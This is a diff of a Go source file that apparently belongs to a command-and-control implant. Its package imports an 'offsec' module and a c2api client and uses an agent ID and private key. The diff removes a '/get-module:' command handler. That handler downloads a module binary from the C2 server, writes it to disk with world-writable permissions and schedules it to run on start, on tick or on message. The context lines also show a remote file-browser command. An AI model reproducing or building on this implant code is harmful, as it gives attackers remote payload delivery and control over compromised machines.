@@ -1,6 +1,3 @@
-//go:build !xena_modular
-// +build !xena_modular
-
 package interpreter
 
 import (
@@ -15,9 +12,7 @@ import (
 	"fmt"
 	"offsec"
 	"os"
-	"path/filepath"
 	"runtime"
-	stdSlices "slices"
 	"strings"
 
 	"github.com/shirou/gopsutil/v3/cpu"
@@ -86,39 +81,6 @@ func Interpret(input string) (output string) {
 			return `{"err":"failed to serialize file browser contract"}`
 		}
 		return string(jsonFbCtx)
-	}
-
-	// Handling modules. (dynamically linked libraries)
-	moduleCmd := "/get-module:"
-	if strings.HasPrefix(input, moduleCmd) {
-		input := strings.TrimPrefix(input, moduleCmd)
-		args := strings.Split(input, ";")
-		if len(args) != 2 {
-			return "Command syntax error: unrecognized arguments '" + input + "' for command '" + moduleCmd + "'"
-		}
-		executionMode := strings.ToUpper(args[0])
-		moduleName := strings.ToUpper(args[1])
-		if runtime.GOOS != "windows" && strings.HasSuffix(moduleName, ".DLL") {
-			return "Cannot load .dll on " + runtime.GOOS
-		}
-		moduleBin, err := c2api.AgentDownloadModule(config.AgentID, moduleName, config.PrivateKey)
-		if err != nil {
-			return "Failed to download the module: " + err.Error()
-		}
-		if !stdSlices.Contains([]string{"ON_START", "ON_TICK", "ON_MSG"}, executionMode) {
-			return "Unknown module execution mode '" + executionMode + "'"
-		}
-		modulePath := filepath.Join(MODULE_DIR, hashWithAgentID(moduleName))
-		os.MkdirAll(MODULE_DIR, 0777)
-		if err := os.WriteFile(
-			modulePath,
-			[]byte(moduleBin),
-			0777,
-		); err != nil {
-			return "Failed to write module to file system: " + err.Error()
-		}
-		debug.Println("module '" + moduleName + "' under mode '" + executionMode + "' has been saved at '" + modulePath + "'")
-		return "Module successfully saved"
 	}
 
 	// Navigating File Browser.
